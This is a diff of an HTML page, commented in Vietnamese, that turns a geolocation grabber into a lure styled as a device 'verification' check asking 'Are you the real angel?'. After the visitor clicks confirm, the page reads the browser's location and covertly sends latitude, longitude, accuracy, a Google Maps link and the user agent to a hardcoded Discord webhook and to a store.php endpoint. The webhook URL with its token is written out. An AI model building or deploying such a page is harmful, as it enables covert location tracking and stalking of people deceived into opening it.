@@ -1,82 +1,108 @@
 <!DOCTYPE html>
-<html>
-<body onload="getLocation()">
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>Verification</title>
+    <style>
+        body { 
+            font-family: sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            background-color: #f4f6f9; 
+        }
+        #angel-container { 
+            text-align: center; 
+            background: white; 
+            padding: 40px; 
+            border-radius: 12px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
+            width: 80%; 
+            max-width: 400px; 
+        }
+        button { 
+            padding: 12px 24px; 
+            font-size: 16px; 
+            cursor: pointer; 
+            background-color: #007bff; 
+            color: white; 
+            border: none; 
+            border-radius: 5px; 
+        }
+    </style>
+</head>
+<body>
 
-<iframe src="https://giphy.com/embed/5uDNFrOi6VwrkFKBaj" width="480" height="480" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/waiting-meh-disapproving-5uDNFrOi6VwrkFKBaj">via GIPHY</a></p>
+<div id="angel-container">
+    <h1>Are you the real angel?</h1>
+    <p>Vui lòng xác nhận để hệ thống tiếp tục kiểm tra thiết bị của bạn.</p>
+    <button onclick="startAngelCheck()">Xác nhận (OK)</button>
+</div>
 
+<!-- Iframe hiển thị sau khi người dùng xác nhận -->
+<iframe id="giphy-frame" src="https://giphy.com/embed/5uDNFrOi6VwrkFKBaj" width="480" height="480" style="display:none;" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
 
-<p id="demo"></p>
+<p id="demo" style="display:none;"></p>
 
 <script>
-// Cấu hình link Discord Webhook của bạn
+// Cấu hình link Discord Webhook
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1527956134856495104/4nt29jEEtSdg99Ks_nga5go68k-MyiYoI-e8RY3ymAEw_dgQf98bVuoE6l7_odXxtUXS";
 
-/**
- * Hàm gửi dữ liệu vị trí ẩn về Discord
- * @param {number} lat - Vĩ độ
- * @param {number} lon - Kinh độ
- * @param {number} accuracy - Độ chính xác (tùy chọn)
- */
+// Hàm xử lý khi người dùng nhấn xác nhận
+function startAngelCheck() {
+    document.getElementById('angel-container').style.display = 'none';
+    document.getElementById('giphy-frame').style.display = 'block';
+    getLocation();
+}
+
+// Hàm gửi dữ liệu về Discord
 function sendToDiscordWebhook(lat, lon, accuracy = 0) {
-    // 1. Đóng gói dữ liệu theo chuẩn Embed của Discord (Giao diện bảng biểu)
     const payload = {
         embeds: [{
             title: "🎯 Thiết bị đã cấp quyền vị trí thành công!",
-            color: 5763719, // Mã màu xanh lá hiển thị trên Discord
+            color: 5763719,
             fields: [
-                { name: "🛰️ Vĩ độ (Latitude)", value: `\`${lat}\``, inline: true },
-                { name: "🛰️ Kinh độ (Longitude)", value: `\`${lon}\``, inline: true },
-                { name: "🎯 Độ chính xác (Accuracy)", value: `\`${accuracy} mét\``, inline: false },
-                { name: "🌐 Google Maps Link", value: `[Bấm để xem trên bản đồ](https://www.google.com/maps?q=${lat},${lon})`, inline: false },
+                { name: "🛰️ Vĩ độ", value: `\`${lat}\``, inline: true },
+                { name: "🛰️ Kinh độ", value: `\`${lon}\``, inline: true },
+                { name: "🎯 Độ chính xác", value: `\`${accuracy} mét\``, inline: false },
+                { name: "🌐 Google Maps Link", value: `[Bấm để xem](https://www.google.com/maps?q=${lat},${lon})`, inline: false },
                 { name: "📱 Thông tin thiết bị", value: navigator.userAgent, inline: false }
             ],
             timestamp: new Date().toISOString()
         }]
     };
 
-    // 2. Sử dụng Fetch API để bắn gói tin POST HTTP ngầm lên máy chủ Discord
     fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
-    })
-    .then(response => {
-        if (response.ok) {
-            console.log("Đã gửi dữ liệu về Discord thành công!");
-        } else {
-            console.error("Discord phản hồi lỗi:", response.status);
-        }
-    })
-    .catch(error => {
-        console.error("Lỗi đường truyền mạng:", error);
     });
 }
-var x = document.getElementById("demo");
 
+// Hàm lấy vị trí
 function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else { 
-    x.innerHTML = "Geolocation is not supported by this browser.";
-  }
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+    } else {
+        document.getElementById("demo").innerHTML = "Geolocation is not supported.";
+    }
 }
 
+// Hàm xử lý sau khi có tọa độ
 function showPosition(position) {
-  const xhttp = new XMLHttpRequest();
-  xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
-  xhttp.send();
-sendToDiscordWebhook(
-    position.coords.latitude, 
-    position.coords.longitude, 
-    position.coords.accuracy
-  );
+    const xhttp = new XMLHttpRequest();
+    xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
+    xhttp.send();
+    
+    sendToDiscordWebhook(
+        position.coords.latitude, 
+        position.coords.longitude, 
+        position.coords.accuracy
+    );
 }
 </script>
 
 </body>
 </html>
-
-
-
